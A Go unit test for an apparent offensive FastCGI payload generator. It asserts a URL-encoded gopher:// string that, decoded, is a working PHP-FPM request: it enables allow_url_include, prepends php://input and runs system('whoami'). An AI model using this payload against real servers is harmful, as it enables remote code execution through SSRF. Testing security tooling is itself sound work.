package fastcgi

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestPayload(t *testing.T) {
	my := NewFastCGI(func(o *Options) {
	})

	assert.Equal(t, "gopher://127.0.0.1:9000/_%01%01%68%57%00%08%00%00%00%01%00%00%00%00%00%00%01%04%68%57%01%ed%03%00%11%0b%47%41%54%45%57%41%59%5f%49%4e%54%45%52%46%41%43%45%46%61%73%74%43%47%49%2f%31%2e%30%0e%04%52%45%51%55%45%53%54%5f%4d%45%54%48%4f%44%50%4f%53%54%0f%1d%53%43%52%49%50%54%5f%46%49%4c%45%4e%41%4d%45%2f%75%73%72%2f%6c%6f%63%61%6c%2f%6c%69%62%2f%70%68%70%2f%53%79%73%74%65%6d%2e%70%68%70%0b%1d%53%43%52%49%50%54%5f%4e%41%4d%45%2f%75%73%72%2f%6c%6f%63%61%6c%2f%6c%69%62%2f%70%68%70%2f%53%79%73%74%65%6d%2e%70%68%70%0c%00%51%55%45%52%59%5f%53%54%52%49%4e%47%0b%1d%52%45%51%55%45%53%54%5f%55%52%49%2f%75%73%72%2f%6c%6f%63%61%6c%2f%6c%69%62%2f%70%68%70%2f%53%79%73%74%65%6d%2e%70%68%70%0d%01%44%4f%43%55%4d%45%4e%54%5f%52%4f%4f%54%2f%0f%0e%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%70%68%70%2f%66%63%67%69%63%6c%69%65%6e%74%0b%09%52%45%4d%4f%54%45%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%0b%04%52%45%4d%4f%54%45%5f%50%4f%52%54%39%39%38%35%0b%09%53%45%52%56%45%52%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%0b%02%53%45%52%56%45%52%5f%50%4f%52%54%38%30%0b%09%53%45%52%56%45%52%5f%4e%41%4d%45%6c%6f%63%61%6c%68%6f%73%74%0f%08%53%45%52%56%45%52%5f%50%52%4f%54%4f%43%4f%4c%48%54%54%50%2f%31%2e%31%0c%10%43%4f%4e%54%45%4e%54%5f%54%59%50%45%61%70%70%6c%69%63%61%74%69%6f%6e%2f%74%65%78%74%0e%02%43%4f%4e%54%45%4e%54%5f%4c%45%4e%47%54%48%33%32%09%1f%50%48%50%5f%56%41%4c%55%45%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%20%3d%20%70%68%70%3a%2f%2f%69%6e%70%75%74%0f%16%50%48%50%5f%41%44%4d%49%4e%5f%56%41%4c%55%45%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%20%3d%20%4f%6e%00%00%00%01%04%68%57%00%00%00%00%01%05%68%57%00%20%00%00%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%77%68%6f%61%6d%69%27%29%3b%20%65%78%69%74%3b%20%3f%3e", my.Payload())
}
